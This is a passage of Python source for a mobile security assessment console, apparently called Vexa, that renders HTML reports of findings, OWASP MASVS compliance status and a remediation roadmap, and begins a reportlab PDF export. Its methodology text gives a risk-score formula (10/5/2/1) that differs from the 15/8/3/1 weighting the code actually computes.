    risk_color = {"CRITICAL":"#f85149","HIGH":"#db6d28","MEDIUM":"#d29922","LOW":"#3fb950"}[risk_label]

    # Severity chips
    chips_html = "".join(
        f'<div class="kpi-chip {k}"><div class="n">{s.get(k, 0)}</div><div class="l">{k.upper()}</div></div>'
        for k in ("critical", "high", "medium", "low", "info"))

    # Findings, grouped by severity
    sev_order = ["critical", "high", "medium", "low", "info"]
    grouped = {sv: [] for sv in sev_order}
    for f in fs:
        sv = f.get("severity", "info")
        if sv in grouped:
            grouped[sv].append(f)

    def render_finding(f, idx):
        sev = f.get("severity", "info")
        title = html.escape(f.get("title", ""))
        desc = html.escape(f.get("description", ""))
        impact = html.escape(f.get("impact", ""))
        fix = html.escape(f.get("fix", "")) or html.escape(f.get("recommendation", ""))
        evidence = html.escape(f.get("evidence", ""))
        cve = html.escape(f.get("cve", "") or "")
        cvss = f.get("cvss")
        cwe = html.escape(f.get("cwe", "") or "")
        masvs = html.escape(f.get("masvs", "") or "")
        refs = f.get("references") or []
        confidence = html.escape(f.get("confidence", "") or "")
        pills = ""
        if confidence:
            pills += f'<span class="pill conf">{confidence}</span>'
        if cvss:
            pills += f'<span class="pill cvss">CVSS {cvss:.1f}</span>'
        if cve:
            pills += f'<span class="pill cve">{cve}</span>'
        if cwe:
            pills += f'<span class="pill cwe">{cwe}</span>'
        if masvs:
            pills += f'<span class="pill masvs">{masvs}</span>'
        refs_html = ""
        if refs:
            refs_html = "<div class='section-h'>References</div><ul class='refs'>" + \
                        "".join(f'<li><a href="{html.escape(u)}" target="_blank" rel="noopener">{html.escape(u)}</a></li>' for u in refs) + \
                        "</ul>"
        return f'''
<article class="finding sev-{sev}">
  <header>
    <div class="finding-num">F-{idx:03d}</div>
    <div class="finding-head">
      <h3>{title}</h3>
      <div class="pills">{pills}</div>
    </div>
    <span class="sev-badge {sev}">{sev.upper()}</span>
  </header>
  <div class="finding-body">
    <div class="section-h">Description</div>
    <p>{desc}</p>
    {f'<div class="section-h">Impact</div><p>{impact}</p>' if impact else ''}
    {f'<div class="section-h">Evidence</div><pre>{evidence}</pre>' if evidence else ''}
    {f'<div class="section-h">Remediation</div><p style="white-space:pre-wrap">{fix}</p>' if fix else ''}
    {refs_html}
  </div>
</article>
'''

    sections_html = []
    finding_idx = 1
    for sv in sev_order:
        items = grouped[sv]
        if not items: continue
        sections_html.append(f'<h2 class="sev-section sev-{sv}">{sv.upper()} <span>({len(items)})</span></h2>')
        for f in items:
            sections_html.append(render_finding(f, finding_idx))
            finding_idx += 1
    findings_html = "".join(sections_html)

    # Application metadata table
    meta_rows = ""
    for k_label, k_val in [
        ("Package / Bundle ID", m.get("package")),
        ("Version", f"{m.get('version_name','')} ({m.get('version_code','')})" if m.get('version_code') else m.get('version_name','')),
        ("Platform", platform),
        ("Min SDK / iOS", m.get("min_sdk")),
        ("Target SDK", m.get("target_sdk")),
        ("File", fname),
        ("File size", f"{(m.get('apk_size_bytes') or 0)/1024/1024:.1f} MB" if m.get('apk_size_bytes') else ""),
    ]:
        if k_val not in (None, ""):
            meta_rows += f'<tr><td class="k">{html.escape(str(k_label))}</td><td>{html.escape(str(k_val))}</td></tr>'

    # Attack surface
    ec = extras.get("exported_components") or []
    surface = {
        "Critical findings": s.get("critical", 0),
        "High findings": s.get("high", 0),
        "Hardcoded secrets": secrets_n,
        "Deep links": len(extras.get("deeplinks") or []),
        "Exported activities": sum(1 for c in ec if c.get("tag") in ("activity","activity-alias")),
        "Exported services": sum(1 for c in ec if c.get("tag") == "service"),
        "Exported receivers": sum(1 for c in ec if c.get("tag") == "receiver"),
        "Content providers": sum(1 for c in ec if c.get("tag") == "provider"),
        "Permissions declared": len(extras.get("permissions") or []),
    }
    surface_html = "".join(
        f'<div class="surf"><div class="n">{v}</div><div class="l">{html.escape(k)}</div></div>'
        for k, v in surface.items())

    # Top CVEs list
    cves_block = ""
    if cves:
        cves_block = '<h2>Known CVE references</h2><div class="cve-list">' + \
                     "".join(f'<a class="cve-tag" href="https://nvd.nist.gov/vuln/detail/{html.escape(c)}" target="_blank">{html.escape(c)}</a>' for c in cves) + \
                     "</div>"

    # ---- MASVS Compliance Status table ----
    masvs_categories = [
        ("MASVS-STORAGE",    "Storage",     "Local data protection"),
        ("MASVS-CRYPTO",     "Cryptography","Cryptographic operations"),
        ("MASVS-AUTH",       "Authentication","Identity & session management"),
        ("MASVS-NETWORK",    "Network",     "Communication security"),
        ("MASVS-PLATFORM",   "Platform",    "Platform interaction"),
        ("MASVS-CODE",       "Code Quality","Code & build settings"),
        ("MASVS-RESILIENCE", "Resilience",  "Anti-tamper & runtime defence"),
        ("MASVS-PRIVACY",    "Privacy",     "Data minimisation"),
    ]
    sev_weight = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
    masvs_rows = []
    for cat_key, cat_label, cat_desc in masvs_categories:
        cat_findings = [f for f in fs if (f.get("category") or "") == cat_key]
        max_sev = max((f.get("severity", "info") for f in cat_findings),
                      key=lambda x: sev_weight.get(x, 0), default="")
        if not cat_findings:
            status, status_color, status_label = "pass", "#3fb950", "PASS"
        elif max_sev in ("critical", "high"):
            status, status_color, status_label = "fail", "#f85149", "NON-COMPLIANT"
        elif max_sev == "medium":
            status, status_color, status_label = "warn", "#d29922", "NEEDS ATTENTION"
        else:
            status, status_color, status_label = "minor", "#8b949e", "MINOR"
        sev_counts = {sv: sum(1 for f in cat_findings if f.get("severity") == sv)
                      for sv in ("critical", "high", "medium", "low", "info")}
        counts_text = " · ".join(f"{v} {sv}" for sv, v in sev_counts.items() if v) or "no findings"
        masvs_rows.append(f'''<tr>
          <td class="masvs-cat-cell"><b>{html.escape(cat_label)}</b><br>
            <span class="masvs-key-cell">{cat_key}</span></td>
          <td class="masvs-desc-cell">{html.escape(cat_desc)}</td>
          <td class="masvs-counts-cell">{counts_text}</td>
          <td><span class="masvs-status-pill" style="background:{status_color}22;color:{status_color};border:1px solid {status_color}55">{status_label}</span></td>
        </tr>''')
    masvs_block = f'''<h2>OWASP MASVS Compliance Status</h2>
<table class="masvs-table">
  <thead><tr><th>Category</th><th>Scope</th><th>Findings detected</th><th style="text-align:right">Status</th></tr></thead>
  <tbody>{"".join(masvs_rows)}</tbody>
</table>
<p style="font-size:11.5px;color:var(--muted);margin-top:8px;line-height:1.55">
  Status mapping: <b>PASS</b> = no findings · <b>MINOR</b> = info / low only ·
  <b>NEEDS ATTENTION</b> = medium severity present ·
  <b>NON-COMPLIANT</b> = high or critical present.
  Reference: <a href="https://owasp.org/www-project-mobile-app-security/" target="_blank">OWASP MASVS</a>.
</p>'''

    # ---- Remediation Roadmap ----
    # Prioritise findings: critical/high first, then medium, with confidence as a tiebreaker.
    conf_weight = {"confirmed": 3, "likely": 2, "possible": 1, "": 1}
    prioritized = sorted(
        [f for f in fs if f.get("severity") in ("critical", "high", "medium")],
        key=lambda f: (-(sev_weight.get(f.get("severity"), 0)),
                       -(conf_weight.get((f.get("confidence") or "").lower(), 1)),
                       -(f.get("cvss") or 0))
    )
    if prioritized:
        # Group into phases
        phase1 = [f for f in prioritized if f.get("severity") == "critical"][:10]
        phase2 = [f for f in prioritized if f.get("severity") == "high"][:10]
        phase3 = [f for f in prioritized if f.get("severity") == "medium"][:10]

        def _phase_html(title, sla, phase, color):
            if not phase:
                return ""
            rows = "".join(
                f'<tr><td>{i+1}</td><td><b>{html.escape(f.get("title",""))}</b><br>'
                f'<span style="font-size:11px;color:var(--muted)">{html.escape(f.get("category",""))}</span></td>'
                f'<td>{html.escape((f.get("recommendation") or f.get("fix") or "")[:180])}</td></tr>'
                for i, f in enumerate(phase))
            return f'''<div class="roadmap-phase" style="border-left-color:{color}">
              <div class="roadmap-h">
                <div class="roadmap-title">{html.escape(title)}</div>
                <div class="roadmap-sla">{html.escape(sla)}</div>
              </div>
              <table class="roadmap-tbl">
                <thead><tr><th style="width:32px">#</th><th>Finding</th><th>Action</th></tr></thead>
                <tbody>{rows}</tbody>
              </table>
            </div>'''

        roadmap_block = '<h2>Remediation Roadmap</h2>' \
            '<p style="color:var(--text2);font-size:13.5px;margin-bottom:14px">' \
            'Findings ordered by severity and confidence. SLAs are recommendations consistent ' \
            'with industry-standard vulnerability response policies and may be tightened or ' \
            'relaxed based on the application\'s deployment context.</p>'
        roadmap_block += _phase_html("Phase 1 — Immediate", "Resolve within 7 days · highest exploitability + impact", phase1, "#f85149")
        roadmap_block += _phase_html("Phase 2 — Short-term", "Resolve within 30 days · significant risk", phase2, "#db6d28")
        roadmap_block += _phase_html("Phase 3 — Medium-term", "Resolve within 90 days · best-practice hardening", phase3, "#d29922")
    else:
        roadmap_block = ""

    # ---- Table of Contents ----
    toc_items = [
        ("#exec-summary", "Executive Summary"),
        ("#metadata", "Application Metadata & Attack Surface"),
    ]
    if any(f.get("category", "").startswith("MASVS") for f in fs):
        toc_items.append(("#masvs-compliance", "OWASP MASVS Compliance Status"))
    if cves:
        toc_items.append(("#cves", "Known CVE References"))
    toc_items.append(("#findings", "Detailed Findings"))
    if roadmap_block:
        toc_items.append(("#roadmap", "Remediation Roadmap"))
    toc_items.append(("#methodology", "Methodology & Scope"))
    toc_html = "<nav class='toc'><h3>Contents</h3><ol>" + \
        "".join(f'<li><a href="{href}">{html.escape(label)}</a></li>' for href, label in toc_items) + \
        "</ol></nav>"

    # ---- Methodology / About / Scope appendix ----
    method_block = f'''<h2 id="methodology">Methodology &amp; Scope</h2>
<div class="method-section">
  <h3>Tooling</h3>
  <p>This report was produced by <b>Vexa</b>, a static and dynamic mobile security assessment console.
  All analysis runs locally; no application binary, secret, or scan output is transmitted off the analyst's workstation.</p>

  <h3>Static analysis coverage</h3>
  <ul>
    <li><b>91 Android analyzers</b> across MASVS-STORAGE, CRYPTO, AUTH, NETWORK, PLATFORM, CODE, RESILIENCE, PRIVACY.</li>
    <li><b>15 iOS analyzers</b> covering ATS, URL schemes, entitlements, keychain, binary hardening, pinning.</li>
    <li><b>39 secret patterns</b> for cloud, payment, messaging, code-hosting, AI, and identity providers.</li>
    <li><b>26 named-CVE cross-references</b> with NVD-published CVSS v3.1 scores.</li>
    <li>Each finding is annotated with confidence: <i>confirmed</i> (binary feature directly observed),
        <i>likely</i> (strong heuristic match), or <i>possible</i> (potential indicator -- manual review recommended).</li>
  </ul>

  <h3>Out of scope</h3>
  <ul>
    <li>Business-logic vulnerabilities (auth bypass, race conditions, IDOR) -- require manual testing.</li>
    <li>Third-party server-side defects -- only client-side controls are analysed.</li>
    <li>Runtime-only vulnerabilities not observable in the binary or manifest.</li>
    <li>Side-channel and physical attacks.</li>
  </ul>

  <h3>Limitations</h3>
  <ul>
    <li>Heuristic findings (confidence: <i>possible</i>) require manual verification before remediation effort is committed.</li>
    <li>Static analysis cannot prove non-existence of vulnerabilities; absence of finding does not equal absence of risk.</li>
    <li>Obfuscated, packed, or DRM-protected binaries may evade some analyzers.</li>
  </ul>

  <h3>Severity scoring</h3>
  <p>Severity is derived from the maximum of the analyzer's intrinsic severity and the CVSS v3.1 base score (where available).
  Risk score = critical × 10 + high × 5 + medium × 2 + low × 1.</p>

  <h3>Standards referenced</h3>
  <ul>
    <li>OWASP Mobile Application Security Verification Standard (MASVS) v2.0</li>
    <li>OWASP Mobile Application Security Testing Guide (MASTG)</li>
    <li>Common Weakness Enumeration (CWE)</li>
    <li>Common Vulnerabilities and Exposures (CVE) — National Vulnerability Database</li>
    <li>CVSS v3.1 — Common Vulnerability Scoring System</li>
  </ul>
</div>'''

    # Logo SVG
    logo_svg = '''<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" width="48" height="48"><defs><linearGradient id="rep-grad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#58a6ff"/><stop offset="50%" stop-color="#2f81f7"/><stop offset="100%" stop-color="#1f4a8c"/></linearGradient></defs><path d="M16 2 L27.5 8.3 L27.5 23.7 L16 30 L4.5 23.7 L4.5 8.3 Z" fill="url(#rep-grad)" stroke="rgba(255,255,255,0.15)" stroke-width="0.5"/><path d="M16 7 L23 11 L23 21 L16 25 L9 21 L9 11 Z" fill="rgba(255,255,255,0.08)"/><path d="M10 12 L16 22 L22 12" stroke="#fff" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/><circle cx="16" cy="22" r="1.5" fill="#fff"/></svg>'''

    return f'''<!doctype html><html lang="en"><head><meta charset="utf-8">
<title>{pkg} -- Security Assessment Report</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
:root{{
  --bg:#0d1117;--panel:#161b22;--panel2:#1c2128;--border:#30363d;
  --text:#e6edf3;--text2:#c9d1d9;--muted:#8b949e;
  --accent:#2f81f7;--accent2:#58a6ff;
  --crit:#f85149;--high:#db6d28;--med:#d29922;--low:#3fb950;--info:#8b949e;
}}
@media print{{
  :root{{--bg:#fff;--panel:#fafbfc;--panel2:#f5f6f8;--border:#d0d7de;
    --text:#1f2328;--text2:#33383f;--muted:#666;--accent:#0969da;}}
  body{{background:#fff;color:#1f2328}}
  .finding{{break-inside:avoid;page-break-inside:avoid}}
  .cover{{page-break-after:always;height:100vh}}
}}
body{{
  background:var(--bg); color:var(--text);
  font:14px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
  max-width:1100px; margin:0 auto; padding:48px 60px;
}}
.cover{{
  text-align:center; padding:80px 0 40px;
  border-bottom:1px solid var(--border); margin-bottom:40px;
}}
.cover .logo{{margin:0 auto 28px;filter:drop-shadow(0 6px 24px rgba(47,129,247,.4))}}
.cover h1{{font-size:38px;font-weight:700;margin-bottom:8px;letter-spacing:-.5px;
  background:linear-gradient(135deg,var(--text),var(--muted));
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}}
.cover .subtitle{{color:var(--muted);font-size:15px;letter-spacing:.5px;margin-bottom:32px;text-transform:uppercase}}
.cover .pkg{{
  display:inline-block; padding:10px 24px;
  background:var(--panel); border:1px solid var(--border); border-radius:8px;
  font-family:ui-monospace,monospace; font-size:13px; color:var(--accent2);
  margin-bottom:36px;
}}
.risk-score{{
  display:inline-block; padding:14px 32px; border-radius:10px;
  font-size:28px; font-weight:700; letter-spacing:.5px;
  background:#0d111722; border:2px solid {risk_color}; color:{risk_color};
  text-shadow:0 0 20px {risk_color}66; margin-top:14px;
}}
.cover .when{{color:var(--muted);font-size:12px;margin-top:32px;font-family:ui-monospace,monospace}}

.exec-summary{{margin-bottom:24px}}
.exec-grid{{
  display:grid; grid-template-columns:repeat(4,1fr); gap:14px;
  margin-top:16px;
}}
.exec-card{{
  background:var(--panel); border:1px solid var(--border);
  border-radius:10px; padding:16px 18px;
}}
.exec-card-h{{
  font-size:10.5px; text-transform:uppercase; letter-spacing:1.4px;
  color:var(--muted); font-weight:600; margin-bottom:8px;
}}
.exec-card-v{{
  font-size:32px; font-weight:700; line-height:1; color:var(--text);
}}
.exec-card-d{{
  font-size:11px; color:var(--muted-2); margin-top:6px; line-height:1.4;
}}
.exec-recs{{
  margin:14px 0 0 24px; padding:0;
  color:var(--text2); font-size:13.5px; line-height:1.7;
}}
.exec-recs li{{margin-bottom:8px}}
.exec-recs b{{color:var(--text)}}
.exec-summary h3{{
  font-size:16px; font-weight:600; color:var(--text);
  margin-bottom:6px; padding-bottom:4px; border-bottom:1px solid var(--border);
}}

h2{{
  font-size:22px;font-weight:700;margin:36px 0 14px;
  border-bottom:1px solid var(--border); padding-bottom:8px;
  color:var(--text);
}}
h2.sev-section{{display:flex;align-items:center;gap:10px;margin-top:30px}}
h2.sev-section span{{color:var(--muted);font-weight:500;font-size:16px}}
h2.sev-section.sev-critical{{border-bottom-color:var(--crit);color:var(--crit)}}
h2.sev-section.sev-high{{border-bottom-color:var(--high);color:var(--high)}}
h2.sev-section.sev-medium{{border-bottom-color:var(--med);color:var(--med)}}
h2.sev-section.sev-low{{border-bottom-color:var(--low);color:var(--low)}}
h2.sev-section.sev-info{{border-bottom-color:var(--info);color:var(--info)}}

.summary-section{{
  display:grid; grid-template-columns:1fr 1fr; gap:24px; margin-bottom:30px;
}}
.box{{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:20px}}
.box h3{{font-size:13px;font-weight:600;text-transform:uppercase;letter-spacing:1.2px;
  color:var(--muted);margin-bottom:14px;border-bottom:1px solid var(--border);padding-bottom:8px}}

/* Table of Contents */
.toc{{
  background:var(--panel); border:1px solid var(--border);
  border-radius:10px; padding:20px 28px; margin-bottom:30px;
}}
.toc h3{{
  font-size:11.5px; text-transform:uppercase; letter-spacing:1.6px;
  color:var(--muted); font-weight:600; margin-bottom:10px;
}}
.toc ol{{margin:0; padding-left:22px; color:var(--text2); line-height:1.85}}
.toc ol li{{margin-bottom:2px}}
.toc a{{color:var(--accent2); text-decoration:none}}
.toc a:hover{{text-decoration:underline}}

/* MASVS compliance table */
.masvs-table{{
  width:100%; border-collapse:collapse; margin-top:12px;
  background:var(--panel); border:1px solid var(--border); border-radius:10px;
  overflow:hidden;
}}
.masvs-table thead{{background:var(--panel2)}}
.masvs-table th{{
  text-align:left; padding:12px 16px; font-size:10.5px;
  text-transform:uppercase; letter-spacing:1.2px; color:var(--muted);
  font-weight:600; border-bottom:1px solid var(--border);
}}
.masvs-table td{{padding:12px 16px; border-bottom:1px solid var(--border); font-size:13px; color:var(--text2)}}
.masvs-table tr:last-child td{{border-bottom:0}}
.masvs-cat-cell{{min-width:160px}}
.masvs-key-cell{{font-family:ui-monospace,monospace; font-size:10.5px; color:var(--muted); letter-spacing:.4px}}
.masvs-desc-cell{{color:var(--muted-2); font-size:12.5px}}
.masvs-counts-cell{{font-family:ui-monospace,monospace; font-size:11.5px; color:var(--text2)}}
.masvs-status-pill{{
  display:inline-block; padding:3px 10px; border-radius:4px;
  font-size:9.5px; font-weight:700; letter-spacing:1.4px;
  text-transform:uppercase; white-space:nowrap;
}}

/* Remediation Roadmap */
.roadmap-phase{{
  background:var(--panel); border:1px solid var(--border);
  border-left:4px solid var(--high);
  border-radius:8px; padding:16px 20px; margin-bottom:14px;
}}
.roadmap-h{{
  display:flex; justify-content:space-between; align-items:center;
  margin-bottom:12px; flex-wrap:wrap; gap:8px;
}}
.roadmap-title{{font-size:15px; font-weight:600; color:var(--text)}}
.roadmap-sla{{
  font-size:11px; color:var(--muted); font-family:ui-monospace,monospace;
  letter-spacing:.3px;
}}
.roadmap-tbl{{width:100%; border-collapse:collapse; font-size:12.5px}}
.roadmap-tbl th{{
  text-align:left; padding:8px 12px; font-size:10px;
  text-transform:uppercase; letter-spacing:1.2px; color:var(--muted);
  border-bottom:1px solid var(--border-2); font-weight:600;
}}
.roadmap-tbl td{{
  padding:10px 12px; border-bottom:1px solid var(--border-2);
  color:var(--text2); vertical-align:top;
}}
.roadmap-tbl tr:last-child td{{border-bottom:0}}
.roadmap-tbl td:first-child{{
  font-family:ui-monospace,monospace; color:var(--muted); font-weight:600;
}}

/* Methodology section */
.method-section{{
  background:var(--panel); border:1px solid var(--border);
  border-radius:10px; padding:24px 28px; color:var(--text2);
}}
.method-section h3{{
  font-size:13px; font-weight:600; color:var(--text);
  margin:18px 0 8px; text-transform:none; letter-spacing:0;
  border-bottom:0; padding-bottom:0;
}}
.method-section h3:first-child{{margin-top:0}}
.method-section p{{font-size:13.5px; line-height:1.65; margin-bottom:8px}}
.method-section ul{{margin:0 0 12px 22px; line-height:1.75; font-size:13px}}
.method-section ul li{{margin-bottom:4px}}

.kpi-row{{display:grid;grid-template-columns:repeat(5,1fr);gap:8px;margin:16px 0}}
.kpi-chip{{
  background:var(--panel); border:1px solid var(--border); border-radius:8px;
  padding:14px 8px; text-align:center;
}}
.kpi-chip .n{{font-size:24px; font-weight:700; font-family:ui-monospace,monospace}}
.kpi-chip .l{{font-size:10px; color:var(--muted); margin-top:4px; letter-spacing:1px}}
.kpi-chip.critical .n{{color:var(--crit)}}
.kpi-chip.high .n{{color:var(--high)}}
.kpi-chip.medium .n{{color:var(--med)}}
.kpi-chip.low .n{{color:var(--low)}}
.kpi-chip.info .n{{color:var(--info)}}

.surf-grid{{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}}
.surf{{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:12px}}
.surf .n{{font-size:22px;font-weight:600;font-family:ui-monospace,monospace}}
.surf .l{{font-size:11px;color:var(--muted);margin-top:4px}}

table.meta{{width:100%;border-collapse:collapse;font-size:13px}}
table.meta td{{padding:8px 12px;border-bottom:1px solid var(--border)}}
table.meta td.k{{width:200px;color:var(--muted);font-size:12px;text-transform:uppercase;letter-spacing:.8px}}
table.meta tr:last-child td{{border-bottom:none}}

.cve-list{{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:20px}}
.cve-tag{{
  display:inline-block;padding:6px 12px;
  background:rgba(210,153,34,.12); color:#e6c476;
  border:1px solid rgba(210,153,34,.4);
  border-radius:6px; font-family:ui-monospace,monospace; font-size:12px;
  text-decoration:none;
}}
.cve-tag:hover{{background:rgba(210,153,34,.2)}}

article.finding{{
  background:var(--panel); border:1px solid var(--border);
  border-radius:10px; margin:14px 0; overflow:hidden;
  border-left:4px solid var(--info);
}}
article.finding.sev-critical{{border-left-color:var(--crit)}}
article.finding.sev-high{{border-left-color:var(--high)}}
article.finding.sev-medium{{border-left-color:var(--med)}}
article.finding.sev-low{{border-left-color:var(--low)}}

article.finding header{{
  display:flex;align-items:flex-start;gap:14px;
  padding:16px 20px; background:var(--panel2);
  border-bottom:1px solid var(--border);
}}
article.finding .finding-num{{
  font-family:ui-monospace,monospace; font-size:11px;
  color:var(--muted); padding-top:3px; min-width:48px;
}}
article.finding .finding-head{{flex:1}}
article.finding h3{{font-size:15px;font-weight:600;margin-bottom:6px}}
article.finding .pills{{display:flex;flex-wrap:wrap;gap:6px}}
.pill{{
  display:inline-block;padding:2px 8px;border-radius:4px;
  font-family:ui-monospace,monospace; font-size:10.5px; font-weight:600;
}}
.pill.cvss{{background:rgba(248,81,73,.12);color:#f8a193;border:1px solid rgba(248,81,73,.3)}}
.pill.cve{{background:rgba(210,153,34,.12);color:#e6c476;border:1px solid rgba(210,153,34,.3)}}
.pill.cwe{{background:rgba(47,129,247,.12);color:var(--accent2);border:1px solid rgba(47,129,247,.3)}}
.pill.masvs{{background:rgba(140,140,140,.12);color:var(--muted);border:1px solid var(--border)}}
.pill.conf{{background:rgba(63,185,80,.12);color:#3fb950;border:1px solid rgba(63,185,80,.3);text-transform:uppercase;letter-spacing:.5px}}

.sev-badge{{
  display:inline-block;padding:4px 10px;border-radius:4px;
  font-size:10px;font-weight:700;letter-spacing:.8px;
}}
.sev-badge.critical{{background:rgba(248,81,73,.15);color:var(--crit);border:1px solid rgba(248,81,73,.4)}}
.sev-badge.high{{background:rgba(219,109,40,.15);color:var(--high);border:1px solid rgba(219,109,40,.4)}}
.sev-badge.medium{{background:rgba(210,153,34,.15);color:var(--med);border:1px solid rgba(210,153,34,.4)}}
.sev-badge.low{{background:rgba(63,185,80,.15);color:var(--low);border:1px solid rgba(63,185,80,.4)}}
.sev-badge.info{{background:rgba(140,148,158,.15);color:var(--info);border:1px solid rgba(140,148,158,.4)}}

article.finding .finding-body{{padding:18px 20px}}
.section-h{{
  font-size:11px; font-weight:700; text-transform:uppercase;
  letter-spacing:1.2px; color:var(--muted); margin:14px 0 6px;
}}
.section-h:first-child{{margin-top:0}}
article.finding p{{font-size:13px; color:var(--text2); margin-bottom:6px; line-height:1.65}}
article.finding pre{{
  background:var(--bg);border:1px solid var(--border);
  padding:10px 14px; border-radius:6px;
  font:11.5px/1.5 ui-monospace,monospace; color:#a8efc1;
  overflow-x:auto; white-space:pre-wrap; word-break:break-word;
}}
.refs{{list-style:none;padding-left:0}}
.refs li{{font-size:12px;margin-bottom:3px}}
.refs a{{color:var(--accent2);text-decoration:none;word-break:break-all}}
.refs a:hover{{text-decoration:underline}}

.foot{{margin-top:60px;padding-top:24px;border-top:1px solid var(--border);
  text-align:center;color:var(--muted);font-size:11px;letter-spacing:1px}}
</style>
</head><body>

<section class="cover">
  <div class="logo">{logo_svg}</div>
  <div class="subtitle">Security Assessment Report</div>
  <h1>{m.get("display_name") or pkg}</h1>
  <div class="pkg">{pkg}{f' &nbsp;·&nbsp; v{ver}' if ver else ''}</div>
  <div>
    <div style="color:var(--muted);font-size:12px;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px">Overall Risk</div>
    <div class="risk-score">{risk_label}</div>
  </div>
  <div class="when">Generated {when} &nbsp;·&nbsp; Vexa</div>
</section>

{toc_html}

<h2 id="exec-summary">Executive Summary</h2>
<div class="exec-summary">
  <p style="color:var(--text2);margin-bottom:16px;font-size:15px;line-height:1.7">
    This security assessment of <b>{pkg}</b> {f"version <b>{ver}</b>" if ver else ""} identified
    <b>{total} security findings</b> spanning {len({f.get('category','') for f in fs if f.get('category')})} OWASP MASVS categories.
    {f"The application contains <b>{secrets_n} hardcoded secret(s)</b> recoverable from the binary -- these constitute immediate, exploitable risks." if secrets_n else "No hardcoded secrets were detected in the binary."}
    {f" Findings reference <b>{len(cves)} known CVE(s)</b>." if cves else ""}
    The overall risk rating is <b style="color:{risk_color}">{risk_label}</b> -- computed from the severity distribution
    weighted as: critical&times;15 + high&times;8 + medium&times;3 + low&times;1 = <b>{risk_score} risk points</b>.
  </p>

  <div class="exec-grid">
    <div class="exec-card">
      <div class="exec-card-h">Risk posture</div>
      <div class="exec-card-v" style="color:{risk_color}">{risk_label}</div>
      <div class="exec-card-d">{risk_score} weighted risk points</div>
    </div>
    <div class="exec-card">
      <div class="exec-card-h">Critical &amp; High</div>
      <div class="exec-card-v">{s.get('critical',0) + s.get('high',0)}</div>
      <div class="exec-card-d">findings requiring urgent attention</div>
    </div>
    <div class="exec-card">
      <div class="exec-card-h">Hardcoded secrets</div>
      <div class="exec-card-v">{secrets_n}</div>
      <div class="exec-card-d">credentials extractable from binary</div>
    </div>
    <div class="exec-card">
      <div class="exec-card-h">CVE references</div>
      <div class="exec-card-v">{len(cves)}</div>
      <div class="exec-card-d">known vulnerabilities cited</div>
    </div>
  </div>

  <h3 style="margin-top:24px">Top recommendations</h3>
  <ol class="exec-recs">
    {("".join(f'<li><b>{html.escape(f.get("title",""))}</b> ({f.get("severity","").upper()}): {html.escape((f.get("recommendation") or f.get("fix") or "Review and remediate")[:200])}</li>' for f in sorted(fs, key=lambda x: {"critical":0,"high":1,"medium":2,"low":3,"info":4}.get(x.get("severity","info"), 4))[:5])) or "<li>No high-priority issues identified.</li>"}
  </ol>
</div>

<div class="kpi-row">{chips_html}</div>

<div class="summary-section" id="metadata">
  <div class="box">
    <h3>Application Metadata</h3>
    <table class="meta"><tbody>{meta_rows}</tbody></table>
  </div>
  <div class="box">
    <h3>Attack Surface</h3>
    <div class="surf-grid">{surface_html}</div>
  </div>
</div>

<section id="masvs-compliance">
{masvs_block}
</section>

<section id="cves">
{cves_block}
</section>

<h2 id="findings">Detailed Findings</h2>
{findings_html}

<section id="roadmap">
{roadmap_block}
</section>

{method_block}

<div class="foot">END OF REPORT &nbsp;·&nbsp; Generated by Vexa &nbsp;·&nbsp; {when}</div>

</body></html>'''


# =============================================================================
# Professional report exports: PDF, Word (.docx), Excel (.xlsx)
# Lazily imported so missing deps don't break the rest of the app.
# =============================================================================

def _report_summary_data(r: dict) -> dict:
    """Compute shared summary stats used by all export formats."""
    m = r.get("metadata", {}) or {}
    s = r.get("summary", {}) or {}
    fs = r.get("findings", []) or []
    extras = r.get("extras", {}) or {}
    secrets_n = sum(1 for f in fs if f.get("id", "").startswith("secret-")
                    or f.get("id", "").startswith("ios-secret-"))
    cves = sorted({f.get("cve") for f in fs if f.get("cve")})
    risk_score = (s.get("critical", 0) * 15 + s.get("high", 0) * 8
                  + s.get("medium", 0) * 3 + s.get("low", 0))
    risk_label = ("CRITICAL" if risk_score >= 45 else "HIGH" if risk_score >= 20
                  else "MEDIUM" if risk_score >= 8 else "LOW")
    return {
        "metadata": m, "summary": s, "findings": fs, "extras": extras,
        "secrets_n": secrets_n, "cves": cves,
        "risk_score": risk_score, "risk_label": risk_label,
        "platform": r.get("platform", "Android"),
        "filename": r.get("filename", ""),
        "when": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC"),
        "total": sum(s.get(k, 0) for k in ("critical","high","medium","low","info")),
    }


@app.get("/api/scan/{sid}/report.pdf")
async def report_pdf(sid: str):
    """Native PDF export via reportlab."""
    try:
        from reportlab.lib.pagesizes import letter
        from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
        from reportlab.lib.units import inch
        from reportlab.lib.colors import HexColor
        from reportlab.lib.enums import TA_LEFT
        from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer,
                                          Table, TableStyle, PageBreak, KeepTogether)
    except ImportError:
        raise HTTPException(503,
            "PDF export requires reportlab. Install with: pip install reportlab")

    r = _load(sid)
    d = _report_summary_data(r)
    m, s, fs, extras = d["metadata"], d["summary"], d["findings"], d["extras"]

    buf = io.BytesIO()
    doc = SimpleDocTemplate(buf, pagesize=letter,
                              leftMargin=0.65*inch, rightMargin=0.65*inch,
                              topMargin=0.7*inch, bottomMargin=0.7*inch,
                              title=f"{m.get('package','app')} -- Security Assessment")

    styles = getSampleStyleSheet()
    styles.add(ParagraphStyle(name='Title2', fontSize=26, leading=30, spaceAfter=14,
                               textColor=HexColor('#1f2328'), fontName='Helvetica-Bold'))
    styles.add(ParagraphStyle(name='Sub', fontSize=11, leading=14, textColor=HexColor('#6e7781'),
                               spaceAfter=8))
    styles.add(ParagraphStyle(name='H2', fontSize=16, leading=20, spaceBefore=18, spaceAfter=10,
                               textColor=HexColor('#1f2328'), fontName='Helvetica-Bold',
                               borderPadding=(0,0,4,0)))
